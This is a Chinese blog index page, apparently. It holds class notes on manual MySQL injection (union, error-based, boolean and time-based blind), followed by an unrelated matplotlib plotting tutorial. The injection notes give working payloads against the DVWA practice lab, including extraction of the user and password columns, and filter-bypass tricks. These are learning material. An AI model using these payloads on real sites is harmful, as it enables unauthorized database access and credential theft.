+<h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p>
+<h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="扩展：正则表达式"><a href="#扩展：正则表达式" class="headerlink" title="扩展：正则表达式"></a>扩展：正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p>
+<p>WAF—Web Application Firewall(Web应用防火墙)</p>
+<p>*匹配前一个字符出现0次或者无限次</p>
+<p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p>
+<p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p>
+<p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p>
+<pre><code>正则表达式：.*test.* 在任意字符中匹配test
+test1
+test2
+test3
+3test4</code></pre>
+<pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次
+.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符
+123456test</code></pre>
+<p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p>
+<p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p>
+<p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p>
+<p>时间型 and sleep(5) —-时间型盲注</p>
+<p>步骤：</p>
+<p>1.选择该注入点的注入方式</p>
+<p>2.判断数据库类型</p>
+<p>3.选择漏洞利用的目标，优先选择读写文件</p>
+<p>4.构造SQL语句进行攻击</p>
+<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul>
+<li>判断闭合类型、使用的语句方法</li>
+<li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li>
+</ul>
+<pre><code>不同数据库的特征：
+mysql information_schema
+sqlserver sysobjects
+oracle dual</code></pre>
+<ul>
+<li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li>
+<li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li>
+</ul>
+<h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul>
+<li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li>
+<li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li>
+<li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li>
+<li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li>
+</ul>
+<h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul>
+<li>内置数据库：information_schema</li>
+</ul>
+<pre><code>内置表schemata，存放数据库名
+内置表tables，存放表名和数据库名的对应关系
+内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre>
+<ul>
+<li>联合查询</li>
+</ul>
+<pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。
+union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre>
+<h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul>
+<li>判断可以注入的方式以及该注入点的闭合形式</li>
+<li>判断前一个SQL语句查询的列数（order by）</li>
+</ul>
+<pre><code>例如对dvwa的注入过程：
+单引号字符型
+联合查询 报错注入 盲注
+判断前一个查询语句查询了两列
+判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）
+说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。
+将查询结果放在一行显示用group_concat()函数。
+编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)
+获取数据库名、表名和列名后查询数据,查询user和password字段的值：
+-1&#39; union select user,password form dvwa.users;</code></pre>
+<ul>
+<li>union select查询数据库、表、字段、数据的信息</li>
+</ul>
+<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p>
+<pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre>
+<p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p>
+<pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre>
+<h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul>
+<li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li>
+<li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li>
+</ul>
+<pre><code>报错注入函数
+extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。
+报错注入的重点：在path的位置构造一个子句</code></pre>
+<ul>
+<li>limit(m,n)从第m行开始，查询后n行的数据。</li>
+</ul>
+<pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行
+limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre>
+<h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre>
+<p>（2）截断函数left()</p>
+<pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre>
+<p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p>
+<pre><code>爆破思想：只改变m和等号后面的字符
+id=1 and (select substr(database(),1,1))=&quot;a&quot;
+id=1 and substr(database(),2,1)=&quot;d&quot;
+id=1 and substr(database(),3,1)=&quot;m&quot;
+id=1 and substr(database(),4,1)=&quot;i&quot;
+id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre>
+<p>（4）regexp+‘正则表达式’</p>
+<pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。
+id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre>
+<p>（5）length()</p>
+<pre><code>1&#39; and (select length(database())&lt;10)</code></pre>
+<p>（6）步骤：</p>
+<ul>
+<li>获取当前需要查询的内容的长度</li>
+<li>根据对应的长度进行每一位字符的爆破</li>
+</ul>
+<p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p>
+<pre><code>1&#39; and (select substr(database(),1,1)=char(97))#
+1&#39; and (select substr(database(),2,1)=char(97))#
+1&#39; and (select substr(database(),3,1)=char(97))#
+1&#39; and (select substr(database(),4,1)=char(97))#
+1&#39; and (select substr(database(),1,1)=char(98))#
+1&#39; and (select substr(database(),2,1)=char(98))#
+......</code></pre>
+<p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
+<p>字母a-z：97-122，MySQL对大小写不敏感</p>
+<p>数字0-1:448-57</p>
+<p>下划线：95</p>
+<p><strong>时间型盲注</strong>：</p>
+<p>if()函数。</p>
+<pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作
+select if(1=1,&quot;success&quot;,&quot;failed&quot;) 
+select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)
+
+?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre>
+<p>**注：</p>
+<ul>
+<li>单引号、双引号被过滤，用char()、十六进制。</li>
+<li>substr()被过滤，用left()、mid()、regexp()、like()</li>
+<li>extractvalue()被过滤，用updataxml()、floor()、exp()</li>
+<li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li>
+<li>过滤了union、select、where等字符串</li>
+</ul>
+<pre><code>将关键字替换成了空字符，
+1.这时可用双写绕过，ununionion
+2.大小写绕过，UnioN</code></pre>
+<ul>
+<li>过滤空格</li>
+</ul>
+<pre><code>将空格替换成了空字符
+1./**/
+2.0x09
+3.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre>
+<ul>
+<li>宽字节注入、堆叠注入</li>
+</ul>
+<p>单引号字符型，可以进行联合查询和报错注入</p>
+<p>1.数据库名 select database();</p>
+<p>2表名</p>
+<p>3.字段名</p>
+<p>mysql 内置数据库：imformation_schema,该数据库默认的三张表schemata、tables、columns</p>
+<p>数据表：</p>
+<p>1.schemata  schema_name属性存放所有数据库名</p>
+<p>2.tables     table_name 存放表名</p>
+<p>3.columns column_name 存放列名</p>
+<pre><code>#在imformation_schema数据库中的schemata表中查询数据库名称为dvwa的数据库
+select schema_name from information_schema.schemata where schema_name=&quot;dvwa&quot;; 
+
+#在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称
+select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; 
+
+#在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段
+select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; </code></pre>
+<p>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</p>
+<pre><code>1&#39; union select 1,2#         字符型
+1 union select 1,2           数字型</code></pre>
+<p> 查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</p>
+<pre><code>-1&#39; union select 1,2#
+#convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。
+select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;
+
+#group_concat()函数，将查询的结果放在一行显示
+select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre>
+<p>order by  x 以x列进行排序</p>
+<p>若order by 3显示正常，order by 4显示异常，则代表有3列</p>
+<p>用order by判断列数时可借助二分法的思想快速判断。</p>
+<pre><code>1&#39; order by 4 --+            字符型
+1 order by 4                 数字型</code></pre>
+<h3 id="扩展：Windows下的命令"><a href="#扩展：Windows下的命令" class="headerlink" title="扩展：Windows下的命令"></a>扩展：Windows下的命令</h3><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用
+tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/运用Python语言(四)-科学计算和可视化02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/">运用Python语言(四)-科学计算和可视化02</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/" class="archive-article-date">
+  	<time datetime="2021-04-16T09:54:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="matplotlib库的使用"><a href="#matplotlib库的使用" class="headerlink" title="matplotlib库的使用"></a>matplotlib库的使用</h2><p><strong>matplotlib是提供数据绘图功能的第三方库，其pyplot子库主要用于实现各种数据展示图形的绘制</strong></p>
+<h3 id="matplotlib-pyplot库概述"><a href="#matplotlib-pyplot库概述" class="headerlink" title="matplotlib.pyplot库概述"></a>matplotlib.pyplot库概述</h3><p>（1）matplotlib.pyplot是matplotlib的子库，引用方式如下：</p>
+<pre><code class="python">&gt;&gt;&gt;import matplotlib.pyplot as plt #后续程序中，plt将代替matplotlib.pyplot</code></pre>
+<p>（2）为了正确显示中文字体，使用以下代码更改默认设置，其中’SimHei’表示黑体字。</p>
+<pre><code class="python">&gt;&gt;&gt; import matplotlib
+&gt;&gt;&gt; matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
+&gt;&gt;&gt; matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]</code></pre>
+<p>（3）字体名称的中英文对照</p>
+<table>
+<thead>
+<tr>
+<th align="center">字体名称</th>
+<th align="center">字体英文表示</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">宋体</td>
+<td align="center">SimSun</td>
+</tr>
+<tr>
+<td align="center">黑体</td>
+<td align="center">SimHei</td>
+</tr>
+<tr>
+<td align="center">楷体</td>
+<td align="center">KaiTi</td>
+</tr>
+<tr>
+<td align="center">微软雅黑</td>
+<td align="center">Microsoft YaHei</td>
+</tr>
+<tr>
+<td align="center">隶书</td>
+<td align="center">LiSu</td>
+</tr>
+<tr>
+<td align="center">仿宋</td>
+<td align="center">FangSong</td>
+</tr>
+<tr>
+<td align="center">幼圆</td>
+<td align="center">YouYuan</td>
+</tr>
+<tr>
+<td align="center">华文宋体</td>
+<td align="center">STSong</td>
+</tr>
+<tr>
+<td align="center">华文黑体</td>
+<td align="center">STHeiti</td>
+</tr>
+<tr>
+<td align="center">苹果丽中黑</td>
+<td align="center">Apple LiGothic Medium</td>
+</tr>
+</tbody></table>
+<p>（4）matplotlib库由一系列有组织有隶属关心的对象构成，对于基础绘图操作来说过于复杂。因此matplotlib提供了一套快捷命令式的绘图接口函数，<strong>即pyplot子模块</strong>。</p>
+<p>（5）pyplot将绘图所需要的对象构建过程封装在函数中，对用户提供了更加友好的接口。pyplot模块提供一批预定义的绘图函数，大多数函数可以从函数名辨别它的功能。</p>
+<h3 id="matplotlib-pyplot库解析"><a href="#matplotlib-pyplot库解析" class="headerlink" title="matplotlib.pyplot库解析"></a>matplotlib.pyplot库解析</h3><p>（1）以下内容使用plt代替matplotlib.pyplot。plt子库提供了一批操作和绘图函数，每个函数代表对图像进行的一个操作，比如创建绘图区域、添加标注或修改坐标轴等。这些函数采用了plt.&lt;b&gt;()形式调用，其中&lt;b&gt;是具体函数名称。</p>
+<p>（2）plt子库中包含了4个与绘图区域有关的函数，如下表所示。</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">plt.figure(figsize=None,facecolor=None)</td>
+<td align="center">创建一个全局绘图区域</td>
+</tr>
+<tr>
+<td align="center">plt.axes(rect,axisbg=’w’)</td>
+<td align="center">创建一个坐标系风格的子绘图区域，axisbg指背景色，默认为white</td>
+</tr>
+<tr>
+<td align="center">plt.subplot(nrows,ncols,plot_number)</td>
+<td align="center">在全局绘图区域中创建一个子绘图区域</td>
+</tr>
+<tr>
+<td align="center">plt.subplots_adjust()</td>
+<td align="center">调整子绘图区域的布局</td>
+</tr>
+</tbody></table>
+<p>（3）使用figure()函数创建一个全局绘图区域，并且使它成为当前的绘图对象，<strong>figsize参数可以指定绘图区域的宽度和高度，单位为英寸。</strong>鉴于figure()函数参数较多，这里采用指定参数名称的方式输入参数。</p>
+<pre><code class="python">plt.figure(figsize(8,4))</code></pre>
+<p>（4）绘制图像之前也不可调用figure()函数创建全局绘图区域，此时，plt子库会自动创建一个默认的绘图区域。显示绘图区域的代码如下：</p>
+<pre><code class="python">&gt;&gt;&gt;plt.figure(figsize(8,4))
+&gt;&gt;&gt;plt.show()</code></pre>
+<p>（5）<strong>subplot()**用于在全局绘图区域内创建子绘图区域，其参数表示将全局绘图区域分成</strong>nrows行和ncols列<strong>，并根据</strong>先行后列的计数方式**在plot_number位置生成一个坐标系。例如：</p>
+<pre><code class="python">&gt;&gt;&gt; plt.subplot(324)    #全局绘图区域被分割成3*2的表格，其中，在第4个位置绘制了一个坐标系。
+&gt;&gt;&gt; plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/eDwWkaCUdbRng2I.png" alt="image-20210417102315753"></p>
+<p>（6）axes()默认创建一个subplot(111)坐标系，参数rect=[left,bottom,width,height]中<strong>4个变量的范围都为[0,1]，</strong>表示坐标系与全局绘图区域的关系；axisbg指背景色，默认为white。</p>
+<pre><code class="python">&gt;&gt;&gt; plt.axes([0.1,0.1,0.7,0.3], axisbg=&#39;y&#39;)
+&gt;&gt;&gt; plt.show()</code></pre>
+<p>（7）plt子库提供了一组读取和显示相关的函数，用于在绘图区域中增加显示内容及读入数据，这些函数需要与其他函数搭配使用，如下表所示</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">plt.legend()</td>
+<td align="center">在绘图区域中放置绘图标签（也称图注）</td>
+</tr>
+<tr>
+<td align="center">plt.show()</td>
+<td align="center">显示创建的绘图对象</td>
+</tr>
+<tr>
+<td align="center">plt.matshow()</td>
+<td align="center">在窗口显示数组矩阵</td>
+</tr>
+<tr>
+<td align="center">plt.imshow()</td>
+<td align="center">在axes上显示图像</td>
+</tr>
+<tr>
+<td align="center">plt.imsave()</td>
+<td align="center">保存数组为图像文件</td>
+</tr>
+<tr>
+<td align="center">plt.imread()</td>
+<td align="center">从文件图像中读取数组</td>
+</tr>
+</tbody></table>
+<p>（8）pyplot模块提供了17个用于绘制“基础图表”的常用函数，如下表所示</p>
+<table>
+<thead>
+<tr>
+<th align="center">操作</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>plt.plot(x,y,label,color,width)</strong></td>
+<td align="center">根据x，y数组绘制直、曲线</td>
+</tr>
+<tr>
+<td align="center">plt.boxplot(data,notch,position)</td>
+<td align="center">绘制一个箱型图</td>
+</tr>
+<tr>
+<td align="center">plt.bar(left,height,width,bottom)</td>
+<td align="center">绘制一个条形图</td>
+</tr>
+<tr>
+<td align="center">plt.barh(bottom,width,height,left)</td>
+<td align="center">绘制一个横向条形图</td>
+</tr>
+<tr>
+<td align="center">plt.polar(theta,r)</td>
+<td align="center">绘制极坐标图</td>
+</tr>
+<tr>
+<td align="center">plt.pie(data,explode)</td>
+<td align="center">绘制饼图</td>
+</tr>
+<tr>
+<td align="center">plt.psd(x,NFFT=256,pad_to,Fs)</td>
+<td align="center">绘制功率谱密度图</td>
+</tr>
+<tr>
+<td align="center">plt.specgram(x,NFFT=256,pad_to,F)</td>
+<td align="center">绘制谱图</td>
+</tr>
+<tr>
+<td align="center">plt.cohere(x,y,NFFT=256,Fs)</td>
+<td align="center">绘制X-Y的相关性函数</td>
+</tr>
+<tr>
+<td align="center">plt.scatter()</td>
+<td align="center">绘制散点图(x,y是长度相同的序列)</td>
+</tr>
+<tr>
+<td align="center">plt.step(x,y,where)</td>
+<td align="center">绘制步阶图</td>
+</tr>
+<tr>
+<td align="center">plt.hist(x,bins,normed)</td>
+<td align="center">绘制直方图</td>
+</tr>
+<tr>
+<td align="center">plt.contour(X,Y,Z,N)</td>
+<td align="center">绘制等值线</td>
+</tr>
+<tr>
+<td align="center">plt.vlines()</td>
+<td align="center">绘制垂直线</td>
+</tr>
+<tr>
+<td align="center">plt.stem(x,y,linefmt,markerfmt,basefmt)</td>
+<td align="center">绘制曲线每个点到水平轴线的垂线</td>
+</tr>
+<tr>
+<td align="center">plt.plot_data()</td>
+<td align="center">绘制数据日期</td>
+</tr>
+<tr>
+<td align="center">plt.plotfile()</td>
+<td align="center">绘制数据后写入文件</td>
+</tr>
+</tbody></table>
+<p>（9）plot()函数是用于绘制直线的最基础的函数，调用方式灵活，x和y可以是numpy计算出的数组，并用关键字参数指定各种属性。其中，labe表示设置标签并在图例中显示，color表示曲线的颜色，linewidth表示曲线的宽度。<strong>在字符串前后添加$符号，matplotlib会使用其内置的latex引擎绘制数学公式。</strong></p>
+<p>（10）实例：在坐标系中绘制基本的三角函数</p>
+<pre><code class="python">import numpy as np
+import matplotlib.pyplot as plt
+x = np.linspace(0, 6, 100)
+y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8
+plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,linewidth=3,linestyle=&quot;-&quot;)
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/MGgRwy7FZj2orLb.png" alt="image-20210417111653192"></p>
+<p>（11）plt库有两个坐标体系，<strong>图像坐标和数据坐标。</strong></p>
+<ul>
+<li>图像坐标将图像所在区域左下角视为原点，将x方向和y方向长度设定为1。整体绘图区域有一个图像坐标，每个axes()和subplot()函数产生的子图也有属于自己的图像坐标。**axes()函数参数rect指当前产生的子区域相对于整个绘图区域的图像坐标。</li>
+<li>数据坐标以当前绘图区域的坐标轴为参考，显示每个点的相对位置，这与坐标系里面标记数据点一致。</li>
+</ul>
+<p>（12）下表给出了与plt库的坐标轴设置相关的函数</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">plt.axis(‘v’,’off’,’equal’,’scaled’,’tight’,’image’)</td>
+<td align="center">获取设置轴属性的快捷方法</td>
+</tr>
+<tr>
+<td align="center">plt.xlim(xmin,xmax)</td>
+<td align="center">设置当前x轴取值范围</td>
+</tr>
+<tr>
+<td align="center">plt.ylim(ymin,ymax)</td>
+<td align="center">设置当前y轴取值范围</td>
+</tr>
+<tr>
+<td align="center">plt.xscale()</td>
+<td align="center">设置x轴缩放</td>
+</tr>
+<tr>
+<td align="center">plt.yscale()</td>
+<td align="center">设置y轴缩放</td>
+</tr>
+<tr>
+<td align="center">plt.autoscale()</td>
+<td align="center">自动缩放轴视图的数据</td>
+</tr>
+<tr>
+<td align="center">plt.text(x,y,s,fontdic,withdash)</td>
+<td align="center">为axes图轴添加注释</td>
+</tr>
+<tr>
+<td align="center">plt.thetagrids(angles,labels,fmt,frac)</td>
+<td align="center">设置极坐标网络theta的位置</td>
+</tr>
+<tr>
+<td align="center">plt.grid(on/off)</td>
+<td align="center">打开或者关闭坐标网络</td>
+</tr>
+</tbody></table>
+<pre><code class="python">&gt;&gt;&gt; plt.plot([1,2,4],[1,2,3])
+&gt;&gt;&gt; plt.axis()   #获得当前坐标轴范围
+(0.85, 4.15, 0.9, 3.1)
+&gt;&gt;&gt; plt.axis([0,5,0,8]) #4个变量分别是[xmin,xmax,ymin,ymax]
+&gt;&gt;&gt; plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/ZP32HJmWCGBtkSQ.png" alt="image-20210417113325710"></p>
+<p>（13）下表给出了13个设置坐标系标签的相关函数</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">plt.figlegend(handles,label,loc)</td>
+<td align="center">为全局绘图区域放置图注</td>
+</tr>
+<tr>
+<td align="center">plt.legend()</td>
+<td align="center">为当前坐标图放置图注</td>
+</tr>
+<tr>
+<td align="center">plt.xlabel(s)</td>
+<td align="center">设置当前x轴的标签</td>
+</tr>
+<tr>
+<td align="center">plt.ylabel(s)</td>
+<td align="center">设置当前y轴的标签</td>
+</tr>
+<tr>
+<td align="center">plt.xticks(array,’a’,’b’,’c’)</td>
+<td align="center">设置当前x轴刻度位置的标签和值</td>
+</tr>
+<tr>
+<td align="center">plt.yticks(array,’a,’b’,’c’)</td>
+<td align="center">设置当前y轴刻度位置的标签和值</td>
+</tr>
+<tr>
+<td align="center">plt.clabel(cs,v)</td>
+<td align="center">为等值线图设置标签</td>
+</tr>
+<tr>
+<td align="center">plt.get_figlabels()</td>
+<td align="center">返回当前绘图区域的标签列表</td>
+</tr>
+<tr>
+<td align="center">plt.figtext(x,y,s,fontdic)</td>
+<td align="center">为全局绘图区域添加文字</td>
+</tr>
+<tr>
+<td align="center">plt.title()</td>
+<td align="center">设置标题</td>
+</tr>
+<tr>
+<td align="center">plt.suptitle()</td>
+<td align="center">为当前绘图区域添加中心标题</td>
+</tr>
+<tr>
+<td align="center">plt.text(x,y,fontdic,withdash)</td>
+<td align="center">为坐标图轴添加注释</td>
+</tr>
+<tr>
+<td align="center">plt.annotate(note,xy,xytext,xycoords,textcoords,arrowprops)</td>
+<td align="center">用箭头在指定数据点创建一个注释或一段文本</td>
+</tr>
+</tbody></table>
+<p>（14）绘制一个带标签的坐标系</p>
+<pre><code class="python">import matplotlib.pyplot as plt
+import matplotlib
+matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
+matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
+plt.plot([1,2,4],[1,2,3])
+plt.title(&quot;坐标系标题&quot;)
+plt.xlabel(&#39;时间(s)&#39;)
+plt.ylabel(&#39;范围(m)&#39;)
+plt.xticks([1,2,3,4,5],[r&#39;$\pi/3$&#39;,r&#39;$2\pi/3$&#39;,r&#39;$\pi$&#39;,\
+                        r&#39;$4\pi/3$&#39;,r&#39;$5\pi/3$&#39;])
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/KRIyBVuktdjeqJY.png" alt="image-20210417125952062"></p>
+<p>（15）plt库提供了3个区域填充函数，对绘图区域填充颜色，如下表示所示</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">fill(x,y,c,color)</td>
+<td align="center">填充多边形</td>
+</tr>
+<tr>
+<td align="center">fill_between(x,y1,y2,where,color)</td>
+<td align="center">填充两条曲线围成的多边形</td>
+</tr>
+<tr>
+<td align="center">fill_betweenx(y,x1,x2,where,hold)</td>
+<td align="center">填充两条水平线之间的区域</td>
+</tr>
+</tbody></table>
+<p>（16）绘制一个带局部阴影的坐标系。</p>
+<pre><code class="python">import matplotlib.pyplot as plt
+import numpy as np
+x = np.linspace(0,10,1000)
+y = np.cos(2*np.pi*x) * np.exp(-x)+0.8
+plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,label=&quot;$exp-decay$&quot;,linewidth=3)
+plt.axis([0,6,0,1.8])
+ix = (x&gt;0.8) &amp; (x&lt;3)
+plt.fill_between(x,y,0,where=ix,\
+                 facecolor=&#39;gray&#39;,alpha=0.25)
+plt.text(0.5*(0.8+3),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\
+         horizontalalignment=&#39;center&#39;)
+plt.legend()
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/8znfgdYXk9KUowq.png" alt="image-20210417131059448"></p>
